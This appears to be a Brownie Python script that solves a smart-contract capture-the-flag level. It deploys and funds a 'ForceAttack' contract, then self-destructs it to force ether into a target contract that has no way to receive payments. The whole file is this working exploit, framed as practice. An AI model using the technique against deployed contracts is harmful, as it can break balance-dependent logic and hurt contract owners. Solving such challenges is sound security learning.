from scripts.context import *
from scripts.account import _from, acc
from brownie import Force, ForceAttack

##########################################
# The goal of this level is to make the balance of the contract greater than zero.
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    force = load_challenge(contract_name=Force, instance_key='force')
    forceattack = ForceAttack.deploy(_from)

    # send some funds to forceattack
    forceattack.reload({'value': 1000} | _from)

    # selfdestruct forceattack to send remaining funds to the force contract
    forceattack.forceEtherIntoAddress(force.address)

    # check that the balance > 0
    balance_assertion = force.balance() > 0
    print(f'Current balance of the contract is {force.balance()}, is this greater than zero: {balance_assertion}')

    return balance_assertion

def main():
    solve_challenge()
